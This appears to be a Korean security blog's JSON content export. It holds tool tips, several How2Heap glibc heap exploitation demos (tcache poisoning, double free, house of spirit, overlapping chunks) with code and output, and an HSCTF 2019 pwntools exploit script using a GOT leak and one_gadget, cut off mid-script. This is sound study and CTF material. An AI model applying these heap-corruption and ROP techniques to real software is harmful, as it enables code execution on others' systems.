{"meta":{"title":"j0n9hyun","subtitle":null,"description":"j0n9yhun's repository","author":"j0n9hyun","url":"http://j0n9hyun.github.io","root":"/"},"pages":[],"posts":[{"title":"Windows Terminal 시작 터미널 변경","slug":"Windows-Terminal-시작-터미널-변경-방법","date":"2019-06-26T16:58:15.000Z","updated":"2019-06-26T17:26:46.298Z","comments":true,"path":"2019/06/27/Windows-Terminal-시작-터미널-변경-방법/","link":"","permalink":"http://j0n9hyun.github.io/2019/06/27/Windows-Terminal-시작-터미널-변경-방법/","excerpt":"","text":"Windows Terminal 시작 터미널 변경 방법 드디어 윈도우 터미널 프리뷰 버전이 스토어에 릴리즈 됐다. 줄곧 WSL관련 기능들을 써왔던 나로썬 매우 반가운 소식이었다. 호다닥 설치하고 잠깐 사용해봤는데 나름대로 만족한다. 그리고 글 쓰다가 알게된 사실인데 마우스 커서를 오른쪽에 대고 드래그해야 터미널을 이동시킬 수 있다. 이 부분은 살짝 불편하긴한데 뭐 적응되겠지. 이제 올 겨울 정식 릴리즈될 WSL2만 남았다. [Windows Terminal Preview] [Windows Terminal 시작 화면] 어쨋든 터미널을 켜면 디폴트로 파워쉘이 띄워진다. + 버튼엔 파워쉘 외에 cmd, ubuntu를 추가로 띄울 수 있는데 본인은 파워쉘을 안 쓰니 켜자마자 파워쉘 나오고 또 우분투로 바꾸기가 번거롭지 않은가? 그래서 설정을 살펴보니 역시 바꿀 수 있었다. [설정창] 사진에 보이는 defaultProfile을 우분투의 profile로 바꿔주면 된다. [Ubuntu Profile] [적용 화면] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"Daily","slug":"Daily","permalink":"http://j0n9hyun.github.io/categories/Daily/"}],"tags":[{"name":"Tips","slug":"Tips","permalink":"http://j0n9hyun.github.io/tags/Tips/"}]},{"title":"[How2Heap] Tcache_House_of_spirit","slug":"How2Heap-Tcache-House-of-spirit","date":"2019-06-26T15:45:55.000Z","updated":"2019-06-26T15:51:02.124Z","comments":true,"path":"2019/06/27/How2Heap-Tcache-House-of-spirit/","link":"","permalink":"http://j0n9hyun.github.io/2019/06/27/How2Heap-Tcache-House-of-spirit/","excerpt":"","text":"Tcache_House_of_spirit 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;fprintf(stderr, \"the house of spirit attack on tcache.\\n\");fprintf(stderr, \"기존의 house of spirit과 비슷한 방식으로 작동하지만 free될 fake chunk 뒤에 fake chunk를 만들 필요가 없다.\\n\");fprintf(stderr, \"malloc.c의 _int_free 함수에서 tcache_put이 다음 chunk의 prev_inuse가 정상인지 확인하지 않고 호출되는 것을 알 수 있다.\\n\");fprintf(stderr, \"(Search for strings \\\"invalid next size\\\" and \\\"double free or corruption\\\")\\n\\n\");fprintf(stderr, \"malloc()을 한 번 호출해서 메모리를 세팅한다.\\n\");malloc(1);fprintf(stderr, \"fake chunk 영역을 가리키기 위해 1 pointer를 overwrite할 것이라고 생각해보자.\\n\");unsigned long long *a; // overwrite할 pointerunsigned long long fake_chunks[10]; // fake chunk 영역fprintf(stderr, \"이 영역에는 하나의 fake chunk가 있다. 크기 필드는 %p에 위치한다.\\n\", &amp;fake_chunks[1]);fprintf(stderr, \"이 chunk 크기는 tcache 범주에 속해야 한다. (chunk 크기 &lt;= 0x410; x64: malloc arg &lt;= 0x408)\\n\"\"prev_inuse(lsb) bit는 tcache chunk의 경우 free로 무시되지만\\n\"\"is_mmapped(두번째 lsb)와 non_main_arena(세번째 lsb) 비트는 문제를 일으킨다.\\n\");/* 이것은 다음 malloc 요청의 크기가 malloc 구현에 사용된 내부 크기로 반올림돼야 한다.Ex) x64: 0x30~0x38은 모두 0x40으로 반올림되어, 끝에 있는 malloc 파라미터에서 작동한다. */fake_chunks[1] = 0x40; // 크기fprintf(stderr, \"이제 첫번째 fake chunk안에 있는 %p를 fake영역의 주소에 pointer를 overwrite할 것이다.\\n\", &amp;fake_chunks[1]);//이 chunk와 관련된 *영역*의 메모리 주소는 16바이트로 정렬돼야 한다.a = &amp;fake_chunks[2];fprintf(stderr, \"overwrite된 pointer를 free한다.\\n\");puts(\"-------free(a)-------\");free(a);fprintf(stderr, \"이제 다음 malloc은 %p에서 fake chunk의 영역을 반환할 것이다. 그것은 %p일 것이다.\\n\", &amp;fake_chunks[1], &amp;fake_chunks[2]);fprintf(stderr, \"malloc(0x30): %p\\n\", malloc(0x30));&#125; the house of spirit attack on tcache. 기존의 house of spirit과 비슷한 방식으로 작동하지만 free될 fake chunk 뒤에 fake chunk를 만들 필요가 없다. malloc.c의 _int_free 함수에서 tcache_put이 다음 chunk의 prev_inuse가 정상인지 확인하지 않고 호출되는 것을 알 수 있다. (Search for strings “invalid next size” and “double free or corruption”) malloc()을 한 번 호출해서 메모리를 세팅한다. fake chunk 영역을 가리키기 위해 1 pointer를 overwrite할 것이라고 생각해보자. 이 영역에는 하나의 fake chunk가 있다. 크기 필드는 0x7fff15cd5518에 위치한다. 이 chunk 크기는 tcache 범주에 속해야 한다. (chunk 크기 &lt;= 0x410; x64: malloc arg &lt;= 0x408) prev_inuse(lsb) bit는 tcache chunk의 경우 free로 무시되지만 is_mmapped(두번째 lsb)와 non_main_arena(세번째 lsb) 비트는 문제를 일으킨다. 이제 첫번째 fake chunk안에 있는 0x7fff15cd5518를 fake영역의 주소에 pointer를 overwrite할 것이다. overwrite된 pointer를 free한다. -------free(a)------- 이제 다음 malloc은 0x7fff15cd5518에서 fake chunk의 영역을 반환할 것이다. 그것은 0x7fff15cd5520일 것이다. malloc(0x30): 0x7fff15cd5520","categories":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/categories/Theory/"}],"tags":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/tags/Theory/"}]},{"title":"[How2Heap] Tcache_Poisoning","slug":"How2Heap-Tcache-Poisoning","date":"2019-06-26T14:42:03.000Z","updated":"2019-06-26T14:46:22.491Z","comments":true,"path":"2019/06/26/How2Heap-Tcache-Poisoning/","link":"","permalink":"http://j0n9hyun.github.io/2019/06/26/How2Heap-Tcache-Poisoning/","excerpt":"","text":"Tcache_Poisoning 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;int main()&#123;fprintf(stderr, \"이것은 malloc을 속여서 pointer를 임의의 위치(이 경우, 스택)로\\n\"\"반환하는 간단한 tcache poisoning 공격이다.\\n\"\"이 공격은 fastbin corruption 공격과 매우 비슷하다.\\n\\n\");size_t stack_var;fprintf(stderr, \"malloc()을 반환할 주소는 %p이다.\\n\", (char *)&amp;stack_var);fprintf(stderr, \"buffer를 한 개 할당한다.\\n\");intptr_t *a = malloc(128);fprintf(stderr, \"malloc(128): %p\\n\", a);fprintf(stderr, \"buffer를 free한다.\\n\");puts(\"-------free(a)-------\");free(a);fprintf(stderr, \"tcache list : [ %p ]\\n\", a);fprintf(stderr, \"조작할 위치(%p)를 가리키도록 %p에 있는 데이터의\\n\"\"처음 %lu 바이트(fd/next pointer)를 overwrite한다.\\n\", &amp;stack_var, a, sizeof(intptr_t));a[0] = (intptr_t)&amp;stack_var;fprintf(stderr, \"1st malloc(128): %p\\n\", malloc(128));fprintf(stderr, \"tcache list : [ %p ]\\n\", &amp;stack_var);intptr_t *b = malloc(128);fprintf(stderr, \"2nd malloc(128): %p\\n\", b);fprintf(stderr, \"조작에 성공했다.\\n\");return 0;&#125; 이것은 malloc을 속여서 pointer를 임의의 위치(이 경우, 스택)로 반환하는 간단한 tcache poisoning 공격이다. 이 공격은 fastbin corruption 공격과 매우 비슷하다. malloc()을 반환할 주소는 0x7fffb6be4b80이다. buffer를 한 개 할당한다. malloc(128): 0x55b69dc26260 buffer를 free한다. -------free(a)------- tcache list : [ 0x55b69dc26260 ] 조작할 위치(0x7fffb6be4b80)를 가리키도록 0x55b69dc26260에 있는 데이터의 처음 8 바이트(fd/next pointer)를 overwrite한다. 1st malloc(128): 0x55b69dc26260 tcache list : [ 0x7fffb6be4b80 ] 2nd malloc(128): 0x7fffb6be4b80 조작에 성공했다.","categories":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/categories/Theory/"}],"tags":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/tags/Theory/"}]},{"title":"[How2Heap] Tcache_dup","slug":"How2Heap-Tcache-dup","date":"2019-06-26T14:17:28.000Z","updated":"2019-06-26T14:25:49.543Z","comments":true,"path":"2019/06/26/How2Heap-Tcache-dup/","link":"","permalink":"http://j0n9hyun.github.io/2019/06/26/How2Heap-Tcache-dup/","excerpt":"","text":"Tcache_dup 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; fprintf(stderr, \"simple double-free attack with tcache.\\n\"); fprintf(stderr, \"buffer를 할당한다.\\n\"); int *a = malloc(8); fprintf(stderr, \"malloc(8): %p\\n\", a); fprintf(stderr, \"free를 두 번 한다.\\n\"); free(a); free(a); puts(\"-------free(a)-------\"); puts(\"-------free(a)-------\"); fprintf(stderr, \"free list : [ %p, %p ]\\n\", a, a); fprintf(stderr, \"다음으로 할당되는 buffer가 동일할 것이다.\\n\" [ %p, %p ]\\n\", malloc(8), malloc(8)); return 0;&#125; simple double-free attack with tcache. buffer를 할당한다. malloc(8): 0x55fef5f8d260 free를 두 번 한다. -------free(a)------- -------free(a)------- free list : [ 0x55fef5f8d260, 0x55fef5f8d260 ] 다음으로 할당되는 buffer가 동일할 것이다. [ 0x55fef5f8d260, 0x55fef5f8d260 ]","categories":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/categories/Theory/"}],"tags":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/tags/Theory/"}]},{"title":"[How2Heap] Overlapping_Chunks_2","slug":"How2Heap-Overlapping-Chunks-2","date":"2019-06-26T13:51:17.000Z","updated":"2019-06-26T14:03:47.098Z","comments":true,"path":"2019/06/26/How2Heap-Overlapping-Chunks-2/","link":"","permalink":"http://j0n9hyun.github.io/2019/06/26/How2Heap-Overlapping-Chunks-2/","excerpt":"","text":"Overlapping_Chunks_2 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;int main()&#123;intptr_t *p1,*p2,*p3,*p4,*p5,*p6;unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;int prev_in_use = 0x1;fprintf(stderr, \"\\nsimple chunks overlapping problem\");fprintf(stderr, \"\\n이것은 인접하지 않은 free chunk를 consolidate하는 공격으로도 참조된다.\\n\");fprintf(stderr, \"\\nchunk 5개 할당\");p1 = malloc(1000);p2 = malloc(1000);p3 = malloc(1000);p4 = malloc(1000);p5 = malloc(1000);real_size_p1 = malloc_usable_size(p1);real_size_p2 = malloc_usable_size(p2);real_size_p3 = malloc_usable_size(p3);real_size_p4 = malloc_usable_size(p4);real_size_p5 = malloc_usable_size(p5);fprintf(stderr, \"\\n\\n%p ~ %p p1 chunk\", p1, (unsigned char *)p1+malloc_usable_size(p1));fprintf(stderr, \"\\n%p ~ %p p2 chunk\", p2, (unsigned char *)p2+malloc_usable_size(p2));fprintf(stderr, \"\\n%p ~ %p p3 chunk\", p3, (unsigned char *)p3+malloc_usable_size(p3));fprintf(stderr, \"\\n%p ~ %p p4 chunk\", p4, (unsigned char *)p4+malloc_usable_size(p4));fprintf(stderr, \"\\n%p ~ %p p5 chunk\\n\", p5, (unsigned char *)p5+malloc_usable_size(p5));memset(p1,'A',real_size_p1);memset(p2,'B',real_size_p2);memset(p3,'C',real_size_p3);memset(p4,'D',real_size_p4);memset(p5,'E',real_size_p5);fprintf(stderr, \"\\np4 chunk를 free해보자. 이 경우, p4이후에 p5가 top chunk에 접하고 있어서 top chunk와 합쳐지지 않는다\\n\"); free(p4);fprintf(stderr, \"\\n사용 중인 p2 chunk의 크기를 chunk_p2 + chunk_p3크기로 overwrite하는 p1 chunk취약점을 트리거하자.\\n\");*(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //&lt;--- BUG HERE fprintf(stderr, \"\\n이제 p2에 free()동작 중에 할당자는 다음 chunk가 p4라고 생각한다. (p2 + p2의 크기가 p4를 가리키기 때문)\\n\");fprintf(stderr, \"\\n이 작업은 기본적으로 p3을 잘못 포함하는 큰 free chunk를 생성한다.\\n\");free(p2);fprintf(stderr, \"\\n이제 이전에 free된 chunk로 만족할 수 있는 크기의 새 chunk를 할당하자\\n\");p6 = malloc(2000);real_size_p6 = malloc_usable_size(p6);fprintf(stderr, \"\\nmalloc()은 우리의 만들어진 큰 free chunk에 의해 충족되었다. 이제 p6과 p3은 overlapping되어 우리는 p3에 있는 데이터를 p6 chunk에 쓰면서 overwrite할 수 있다.\");fprintf(stderr, \"\\n%p ~ %p p6 chunk \", p6, (unsigned char *)p6+real_size_p6);fprintf(stderr, \"\\n%p ~ %p p3 chunk\\n\", p3, (unsigned char *) p3+real_size_p3); fprintf(stderr, \"\\np3 chunk의 data: \\n\\n\");fprintf(stderr, \"%s\\n\",(char *)p3); fprintf(stderr, \"\\np6안에 뭔가 써보자.\\n\");puts(\"-------memset(p6,'F',1500)-------\");memset(p6,'F',1500); fprintf(stderr, \"\\np3 chunk의 data: \\n\\n\");fprintf(stderr, \"%s\\n\",(char *)p3); &#125; simple chunks overlapping problem 이것은 인접하지 않은 free chunk를 consolidate하는 공격으로도 참조된다. heap에 chunk를 5개 할당한다. 0x603010 ~ 0x6033f8 p1 chunk 0x603400 ~ 0x6037e8 p2 chunk 0x6037f0 ~ 0x603bd8 p3 chunk 0x603be0 ~ 0x603fc8 p4 chunk 0x603fd0 ~ 0x6043b8 p5 chunk p4 chunk를 free해보자. 이 경우, p4이후에 p5가 top chunk에 접하고 있어서 top chunk와 합쳐지지 않는다 사용 중인 p2 chunk의 크기를 chunk_p2 + chunk_p3크기로 overwrite하는 p1 chunk취약점을 트리거하자. 이제 p2에 free()동작 중에 할당자는 다음 chunk가 p4라고 생각한다. (p2 + p2의 크기가 p4를 가리키기 때문) 이 작업은 기본적으로 p3을 잘못 포함하는 큰 free chunk를 생성한다. 이제 이전에 free된 chunk로 만족할 수 있는 크기의 새 chunk를 할당하자 malloc()은 우리의 만들어진 큰 free chunk에 의해 충족되었다. 이제 p6과 p3은 overlapping되어 우리는 p3에 있는 데이터를 p6 chunk에 쓰면서 overwrite할 수 있다. 0x603400 ~ 0x603bd8 p6 chunk 0x6037f0 ~ 0x603bd8 p3 chunk p3 chunk의 data: CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC p6안에 뭔가 써보자. -------memset(p6,‘F’,1500)------- p3 chunk의 data: FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC","categories":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/categories/Theory/"}],"tags":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/tags/Theory/"}]},{"title":"IDA Pro 7.2 한글 스트링 지원","slug":"IDA-Pro-7-2-한글-스트링-지원","date":"2019-06-24T10:04:12.000Z","updated":"2019-06-24T10:20:58.735Z","comments":true,"path":"2019/06/24/IDA-Pro-7-2-한글-스트링-지원/","link":"","permalink":"http://j0n9hyun.github.io/2019/06/24/IDA-Pro-7-2-한글-스트링-지원/","excerpt":"","text":"IDA Pro 7.2 한글 스트링 지원 7.0 버전까지만 해도 clt 파일을 따로 추가해줘야 했는데 7.2 부턴 그냥 한줄 추가만 해주면 된다. 제작자가 파일을 보냈다고 했는데 회사에서 잘 반영해준 것 같다. 상단의 주석에도 IDA 사용자가 제공해줬다고 적혀있다. [Korean.clt] [IDA Pro 7.2] img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"Daily","slug":"Daily","permalink":"http://j0n9hyun.github.io/categories/Daily/"}],"tags":[]},{"title":"[How2Heap] Overlapping_Chunks","slug":"How2Heap-Overlapping-Chunks","date":"2019-06-20T13:59:02.000Z","updated":"2019-06-20T14:09:51.401Z","comments":true,"path":"2019/06/20/How2Heap-Overlapping-Chunks/","link":"","permalink":"http://j0n9hyun.github.io/2019/06/20/How2Heap-Overlapping-Chunks/","excerpt":"","text":"Overlapping_Chunks.c 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;int main(int argc , char* argv[]) &#123;intptr_t *p1,*p2,*p3,*p4;fprintf(stderr, \"이 기법은 glibc에서 tcache옵션이 disabled된 상태에만 작동한다.\\n\");fprintf(stderr, \"\\nsimple chunks overlapping\\n\\n\");fprintf(stderr, \"heap에 chunk 3개를 할당해보자.\\n\");p1 = malloc(0x100 - 8);p2 = malloc(0x100 - 8);p3 = malloc(0x80 - 8);fprintf(stderr, \"3개의 chunk가 여기에 할당됐다:\\np1=%p\\np2=%p\\np3=%p\\n\", p1, p2, p3);memset(p1, '1', 0x100 - 8);memset(p2, '2', 0x100 - 8);memset(p3, '3', 0x80 - 8);fprintf(stderr, \"\\n이제 p2 chunk를 free시켜보자\\n\");free(p2);fprintf(stderr, \"p2 chuck는 이제 unsorted bin안에서 그 크기의 새로운 malloc()을 제공할 준비가 되어있다\\n\");fprintf(stderr, \"이제 p2를 free시킨 chunk의 크키를 overwrite할 수 있는 overflow를 시연해보자.\\n\");fprintf(stderr, \"toy 프로그램의 경우, 마지막 세 개의 bit값은 중요하지 않다;\"\"하지만, heap의 안정성을 유지하는 것이 베스트다.\\n\");fprintf(stderr, \"이 안정성을 유지하기 위해 우리는 최하위 bit를 1(prev_inuse)로 표시할 것이다,\"\"p1이 free chunk로 오인하지 않고 확실히 하기 위해\\n\");int evil_chunk_size = 0x181;int evil_region_size = 0x180 - 8;fprintf(stderr, \"우리는 p2 chunk의 크기를 %d로 설정할 것이다, 그렇게 하는 것은 우리에게 \\n%d의 region size를 준다.\\n\",evil_chunk_size, evil_region_size);*(p2-1) = evil_chunk_size; // 우리는 p2 chunk의 \"크기\" field를 overwrite하고 있다.fprintf(stderr, \"\\n이제 다른 chunk를 주입된 p2 chunk의 데이터 크기와 똑같은 크기에 할당해준다.\\n\");fprintf(stderr, \"이 malloc은 우리가 크기를 바꾸었던, unsorted bin안에 있는, 전에 free되었던 chunk로부터 제공되어질 것이다.\\n\");p4 = malloc(evil_region_size);fprintf(stderr, \"\\np4는 %p에 할당되었고 and %p에서 끝난다.\\n\", (char *)p4, (char *)p4+evil_region_size);fprintf(stderr, \"p3는 %p에서 시작해 %p에서 끝난다\\n\", (char *)p3, (char *)p3+0x80-8);fprintf(stderr, \"p4는 p3와 overlap되어야한다, 이 경우에 p4는 모든 p3를 포함한다.\\n\");fprintf(stderr, \"\\n이제 p4 chunk안에 복사된 모든 것들은 p3 chunk에 있는 데이터를 overwrite할 수 있다,\"\"그리고 p3 chunk에 쓰여진 데이터는 p4 chunk 안에 저장되어있는 데이터를 overwrite할 수 있다.\\n\\n\");fprintf(stderr, \"이제 예시를 돌려보자. 지금, 우리는 가지고 있다:\\n\");fprintf(stderr, \"p4 = %s\\n\", (char *)p4);fprintf(stderr, \"p3 = %s\\n\", (char *)p3);fprintf(stderr, \"\\nIf we memset(p4, '4', %d), we have:\\n\", evil_region_size);memset(p4, '4', evil_region_size);fprintf(stderr, \"p4 = %s\\n\", (char *)p4);fprintf(stderr, \"p3 = %s\\n\", (char *)p3);fprintf(stderr, \"\\nAnd if we then memset(p3, '3', 80), we have:\\n\");memset(p3, '3', 80);fprintf(stderr, \"p4 = %s\\n\", (char *)p4);fprintf(stderr, \"p3 = %s\\n\", (char *)p3);&#125; 이 기법은 glibc에서 tcache옵션이 disabled된 상태에만 작동한다. simple chunks overlapping heap에 chunk 3개를 할당해보자. 3개의 chunk가 여기에 할당됐다: p1=0x603010 p2=0x603110 p3=0x603210 이제 p2 chunk를 free시켜보자 p2 chuck는 이제 unsorted bin안에서 그 크기의 새로운 malloc()을 제공할 준비가 되어있다 이제 p2를 free시킨 chunk의 크키를 overwrite할 수 있는 overflow를 시연해보자. toy 프로그램의 경우, 마지막 세 개의 bit값은 중요하지 않다. 하지만, heap의 안정성을 유지하는 것이 베스트다. 이 안정성을 유지하기 위해 우리는 최하위 bit를 1(prev_inuse)로 표시할 것이다. p1이 free chunk로 오인하지 않고 확실히 하기 위해 우리는 p2 chunk의 크기를 385로 설정할 것이다. 그렇게 하는 것은 우리에게 376의 region size를 준다. 이제 다른 chunk를 주입된 p2 chunk의 데이터 크기와 똑같은 크기에 할당해준다. 이 malloc은 우리가 크기를 바꾸었던, unsorted bin안에 있는, 전에 free되었던 chunk로부터 제공되어질 것이다. p4는 0x603110에 할당되었고 0x603288에서 끝난다. p3는 0x603210에서 시작해 0x603288에서 끝난다 p4는 p3와 overlap되어야한다, 이 경우에 p4는 모든 p3를 포함한다. 이제 p4 chunk안에 복사된 모든 것들은 p3 chunk에 있는 데이터를 overwrite할 수 있다 그리고 p3 chunk에 쓰여진 데이터는 p4 chunk 안에 저장되어있는 데이터를 overwrite할 수 있다. 이제 예시를 돌려보자. 지금, 우리는 가지고 있다: p4 = x 3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333 If we memset(p4, ‘4’, 376), we have: p4 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444 p3 = 444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444 And if we then memset(p3, ‘3’, 80), we have: p4 = 4444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444 p3 = 333333333333333333333333333333333333333333333333333333333333333333333333333333334444444444444444444444444444444444444444","categories":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/categories/Theory/"}],"tags":[{"name":"Theory","slug":"Theory","permalink":"http://j0n9hyun.github.io/tags/Theory/"}]},{"title":"IDA Pro 한글 스트링 적용 방법","slug":"ida-7.0-korean-string-apply","date":"2019-06-13T04:37:48.000Z","updated":"2019-06-17T12:20:41.310Z","comments":true,"path":"2019/06/13/ida-7.0-korean-string-apply/","link":"","permalink":"http://j0n9hyun.github.io/2019/06/13/ida-7.0-korean-string-apply/","excerpt":"","text":"IDA Pro Korean String 적용 방법 패치 파일 바이너리 파일에 영어가 아닌 다른 언어가 입력돼있으면 IDA에서는 puts(byte_8048840) 처럼 한글 그대로 나오지 않는 것을 볼 수 있다. 물론 대부분은 영어로 작성돼있고 이렇게 돼있는다 한들, 보는 데 크게 지장을 주진 않지만 그래도 한번 찾아본 결과, 방법을 알아볼 수 있었다. 해당 설명은 IDA Pro 7.0 버전을 기준으로 설명한다. [IDA Pro] 우선 위에 있는 패치 파일을 다운 받고 압축을 풀어서 IDA 설치 경로 안에 있는 cfg 폴더에 넣어준다. 기본경로:C:\\Program Files\\IDA 7.0\\cfg [ida.cfg] 다음 ida.cfg 파일을 열어서 분홍박스처럼 한 줄 추가해주면 적용이 완료된다. (앞에 주석을 실수로 달았다. //는 빼주자) [적용 화면] 세 줄 요약 1. 패치 파일 다운 받아서 압축 품 2. 파일을 IDA 설치 경로에 있는 cfg 폴더 안에 넣음 3. ida.cfg 파일에 한 줄 추가함 Source img.border-shadow{ border:1px solid #888888; box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19); }","categories":[{"name":"Daily","slug":"Daily","permalink":"http://j0n9hyun.github.io/categories/Daily/"}],"tags":[{"name":"Tips","slug":"Tips","permalink":"http://j0n9hyun.github.io/tags/Tips/"}]},{"title":"HSCTF 2019 Combo Chain","slug":"HSCTF-2019-Combo-Chain","date":"2019-06-08T22:28:42.000Z","updated":"2019-06-08T22:58:20.472Z","comments":true,"path":"2019/06/09/HSCTF-2019-Combo-Chain/","link":"","permalink":"http://j0n9hyun.github.io/2019/06/09/HSCTF-2019-Combo-Chain/","excerpt":"","text":"Combo Chain Binary File 123456789101112131415161718192021222324252627282930313233343536373839from pwn import *#r = process('./combo-chain')r = remote('pwn.hsctf.com', 2345)e = ELF('./combo-chain')libc = e.libcru = lambda a: r.recvuntil(a)sl = lambda a: r.sendline(a)sa = lambda a, b: r.sendafter(a, b)sla = lambda a, b: r.sendlineafter(a, b)ex = lambda : r.interactive()gets_offset = libc.symbols['gets']gets_got = e.got['gets']printf_plt = e.plt['printf']main = e.symbols['main']pr = 0x0000000000401263 # pop rdi; retnop = 0x000000000040114fone_gadget = 0x4526ap = \"\"p += \"\\x90\"*16p += p64(pr)p += p64(gets_got)p += p64(nop)p += p64(printf_plt)p += p64(main)sla(\": \", p)leaked = u64(r.recv(6).ljust(8, \"\\x00\"))print hex(leaked)libc_base = leaked - gets_offsetone_shot = libc_base + one_gadgetp = \"\"p += \"\\x90\"*16p += p64(one_shot)sla(\": \", 